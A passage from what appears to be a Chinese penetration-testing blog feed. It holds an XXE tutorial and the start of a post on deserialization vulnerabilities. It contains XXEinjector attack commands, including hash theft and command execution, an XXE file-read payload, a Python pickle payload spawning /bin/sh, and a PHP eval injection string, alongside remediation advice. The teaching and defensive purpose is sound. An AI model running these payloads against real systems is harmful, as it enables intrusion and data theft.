--host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt</span><br></pre></td></tr></table></figure><p>使用HTTP带外方法和netdoc协议对文件进行爆破攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc</span><br></pre></td></tr></table></figure><p>通过直接性漏洞利用方式进行资源枚举：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK</span><br></pre></td></tr></table></figure><p>枚举未过滤的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all</span><br></pre></td></tr></table></figure><p>窃取Windows哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes</span><br></pre></td></tr></table></figure><p>使用Java jar上传文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf</span><br></pre></td></tr></table></figure><p>使用PHP expect执行系统指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls</span><br></pre></td></tr></table></figure><p>测试XSLT注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt</span><br></pre></td></tr></table></figure><p>记录请求信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt</span><br></pre></td></tr></table></figure><h2 id="XXE-漏洞修复与防御方案"><a href="#XXE-漏洞修复与防御方案" class="headerlink" title="XXE 漏洞修复与防御方案"></a>XXE 漏洞修复与防御方案</h2><ol><li><p>推荐使用开发语言提供的<strong>禁用外部实体</strong>的方法。</p><p>PHP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>JAVA：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>python：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p>过滤用户提交的 XML 数据</p><p>过滤关键词：<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、SYSTEM、PUBLIC</p></li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>xxe-lab</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811163807711.png" alt="image-20220811163807711"></p><p>登陆界面，输入用户名密码，抓包</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811163854896.png" alt="image-20220811163854896"></p><p>发现输入的数据使用post请求发送，且格式类似XML。</p><p>构造payload，执行文件读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;test;&lt;/username&gt;   &lt;!-- 实体引用 --&gt;</span><br><span class="line">&lt;password&gt;Mikasa&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811164116973.png" alt="image-20220811164116973"></p><p>成功获取到Windows配置信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/08DlKYbVXPt</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="https://frankcao3.github.io/posts/58219"/>
    <id>https://frankcao3.github.io/posts/58219</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:01:52.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>参考：<a href="https://www.anquanke.com/post/id/224769">https://www.anquanke.com/post/id/224769</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p><strong>序列化</strong> ：</p><p>概念：将对象转换成字节序列（json&#x2F;xml文件）。</p><p>作用：在传递和保存对象时，序列化可以保证对象的完整性和可传递性。对象被转换为有序字节序列，以便在网络上传输或者保存在本地文件中。</p></li><li><p><strong>反序列化</strong>：</p><p>概念：将字节序列（json&#x2F;xml文件）转换成对象。</p><p>作用：根据字节序列中保存的对象状态及描述信息，通过反序列化重建对象。</p></li></ul><h2 id="序列化的优点"><a href="#序列化的优点" class="headerlink" title="序列化的优点"></a>序列化的优点</h2><p>将对象转为字节流存储到硬盘上，当 JVM （java虚拟机）停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）。</p><p>序列化为字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。</p><p>通过序列化可以在进程间传递对象。</p><h2 id="序列化的实现"><a href="#序列化的实现" class="headerlink" title="序列化的实现"></a>序列化的实现</h2><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>Java中，只有实现了 <strong>Serializable</strong> 或者 <strong>Externalizable</strong> 接口的类的对象才能被序列化为字节序列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">java.io.ObjectOutputStream：对象输出流。</span><br><span class="line">该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">java.io.ObjectInputStream：对象输入流。</span><br><span class="line">该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.out&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  <span class="comment">// 将序列化的输出定向到fos</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;lihao&quot;</span>, <span class="string">&quot;wjwlh&quot;</span>, <span class="string">&quot;21&quot;</span>);</span><br><span class="line">            oos.writeObject(student1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.out&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">            <span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> (Student) ois.readObject();</span><br><span class="line">            System.out.println(student2.getUserName()+ <span class="string">&quot; &quot;</span> +</span><br><span class="line">                    student2.getPassword() + <span class="string">&quot; &quot;</span> + student2.getYear());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外java还有其他序列化实现方式，比如 <strong>json</strong>、&#x3D;&#x3D;<strong>fastjson</strong>&#x3D;&#x3D;、<strong>ProtoBuff</strong>、<strong>Hessian</strong>、<strong>Kyro</strong>等。</p><p>参考：<a href="https://blog.csdn.net/m0_46201444/article/details/115081351%E3%80%82">https://blog.csdn.net/m0_46201444/article/details/115081351。</a></p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>php中，序列化和反序列化对应的函数分别为 <strong>serialize()</strong> 和 **unserialize()**。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span>=<span class="keyword">array</span>(<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Like&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>));    <span class="comment">// 对数组进行序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;xiaocui&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$M</span> = <span class="title function_ invoke__">newman</span>();  <span class="comment">//创建一个对象</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$M</span>));        <span class="comment">// 对对象进行序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>数组的序列化</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;a:3:&#123;i:0;s:1:&quot;I&quot;;i:1;s:4:&quot;Like&quot;;i:2;s:3:&quot;PHP&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">a:3 a代表一数组，3代表数组中有3个元素</span><br><span class="line">i:0 代表元素的下标值为0</span><br><span class="line">s:1 代表元素的数据类型为字符型,长度为1</span><br></pre></td></tr></table></figure><p><strong>对象的序列化</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;xiaocui&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:8:&quot;manage&quot;;i:26;&#125;&quot;</span><br><span class="line"></span><br><span class="line">O:3 代表是一个对象，其类名的长度为3</span><br><span class="line">3 代表类中的字段数</span><br><span class="line">s:4 代表属性的类型为字符型，长度为4</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><p>数组的序列化和反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $stu=[&#x27;tom&#x27;, &#x27;berry&#x27;, &#x27;ketty&#x27;];</span><br><span class="line">    $str=serialize($stu); // 序列化</span><br><span class="line">    file_put_contents(&#x27;./stu.txt&#x27;, $str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122702017.png" alt="image-20220805122702017" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 数组的反序列化</span><br><span class="line">    $str=file_get_contents(&#x27;./stu.txt&#x27;);</span><br><span class="line">    $stu=unserialize($str);</span><br><span class="line">    print_r($stu);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122807404.png" alt="image-20220805122807404"></p><p>对象的序列化和反序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Student &#123;</span><br><span class="line">        public $name;</span><br><span class="line">        protected $sex;</span><br><span class="line">        private $add;</span><br><span class="line">        public function __construct($name, $sex, $add)&#123;</span><br><span class="line">            $this-&gt;name=$name;</span><br><span class="line">            $this-&gt;sex=$sex;</span><br><span class="line">            $this-&gt;add=$add;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 测试</span><br><span class="line">    $stu=new Student(&#x27;tom&#x27;, &#x27;男&#x27;, &#x27;北京&#x27;);</span><br><span class="line">    // 序列化</span><br><span class="line">    $str=serialize($stu);</span><br><span class="line">    file_put_contents(&#x27;./stu.txt&#x27;, $str);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122910666.png" alt="image-20220805122910666" style="zoom:55%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 反序列化</span><br><span class="line">    $str=file_get_contents(&#x27;./stu.txt&#x27;);</span><br><span class="line">    $stu=unserialize($str);</span><br><span class="line">    var_dump($stu);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805123011403.png" alt="image-20220805123011403"></p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>Python中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p><p><code>pickle</code>有如下四种操作方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dump对象序列化到文件对象并存入文件</span><br><span class="line">dumps对象序列化为 bytes 对象</span><br><span class="line">load对象反序列化并从文件中读取数据</span><br><span class="line">loads从 bytes 对象反序列化</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self, name=<span class="string">&#x27;h3rmesk1t&#x27;</span></span>):</span><br><span class="line">self.name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"><span class="comment"># 序列化输出为b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\th3rmesk1t\x94sb.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)</span><br><span class="line"><span class="comment"># 反序列化输出为 h3rmesk1t</span></span><br></pre></td></tr></table></figure><p><strong>python反序列化漏洞原理：</strong></p><p>python反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。类似于PHP中的<code>__wakeup()</code>方法。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))   <span class="comment"># 反序列化创建对象时调用__reduce__，执行恶意代码</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>序列化或反序列化的过程中会<strong>自动调用</strong>一些魔术方法。</p><p><strong>php 中 magic函数命名是以符号“__”开头的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__construct：当一个对象创建时调用（constructor）</span><br><span class="line"></span><br><span class="line">__destruct：当一个对象被销毁时调用（destructor）</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()：当把一个类当作函数使用时自动调用</span><br><span class="line"></span><br><span class="line">__toString：当一个对象被当作一个字符串处理时自动调用</span><br><span class="line"></span><br><span class="line">__sleep：在使用<span class="title function_ invoke__">serialize</span>()函数时，程序会检查类中是否存在一个<span class="title function_ invoke__">__sleep</span>()魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。</span><br><span class="line"></span><br><span class="line">__wakeup：在使用<span class="title function_ invoke__">unserialize</span>()时，会检查是否存在一个<span class="title function_ invoke__">__wakeup</span>()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()：在对象中调用一个不存在或者不可访问方法时，__call会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()：给不可访问属性赋值时，__set会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()：对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时，<span class="title function_ invoke__">__isset</span>()会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()：对不可访问属性调用<span class="keyword">unset</span>()时，<span class="title function_ invoke__">__unset</span>()会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()：读取不可访问属性的值时，__get会被调用。</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p><p>PHP反序列化漏洞的形成的根本原因是<strong>程序没有对用户输入的序列化字符串进行检测，导致反序列化过程可以被恶意控制（执行魔术方法），进而造成代码执行（XSS等）、getshell等一系列不可控的后果</strong>。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p><p>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些<strong>自定义数据</strong>，进而在反序列化的时候能够使用 readObject 进行读取。如果用户自定义了一些恶意数据在序列化字符串中，在反序列化为对象时，其中的变量被用于命令执行等操作，就会造成反序列化漏洞。</p><p><strong>注意</strong>：<em>反序列化对象时，不会调用对象的构造函数，因为是反序列化得来的。但是在程序结束时会调用对象的析构函数。</em></p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>反序列化函数中的<strong>参数可控</strong>（Java反序列化等）</li><li>存在可利用的类，且类中有<strong>魔术方法</strong>（php、python反序列化等）</li></ol><p>例如，有如下PHP实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$id</span> = <span class="string">&#x27;Baize&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;id);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以确定可控参数是GET型string参数，并且后端接收参数后会进行反序列化操作。同时，test类中存在__wakeup魔术方法，操作是eval($id)。</p><p>那么我们思路是：构造test类的序列化字符串，使得反序列化后的$id值为要执行的操作（代码执行漏洞），例如我们要执行phpinfo()，那么可以构造这样一个字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:2:&quot;id&quot;;s:10:&quot;phpinfo();&quot;&#125;</span><br></pre></td></tr></table></figure><p>这样反序列化会时就会自动调用<code>__wakeup</code>魔术方法，即执行<code>eval(phpinfo();)</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813131438447.png" alt="image-20220813131438447"></p><h3 id="POP链构造（php）"><a href="#POP链构造（php）" class="headerlink" title="POP链构造（php）"></a>POP链构造（php）</h3><p>其实实际中基本不会有上述实例这种这么简单的利用过程，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。关注整个函数的调用过程中参数的传递情况，找到可利用的点。</p><p>**POP CHAIN(POP链)**：</p><p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p><p><strong>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</strong></p><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>test.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;   <span class="comment"># 如果$obj变量存在则返回调用$obj对象中的Delete()函数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  <span class="comment"># 存在任意文件删除的漏洞</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_file</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;     <span class="comment"># 如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</span></span><br><span class="line"><span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span 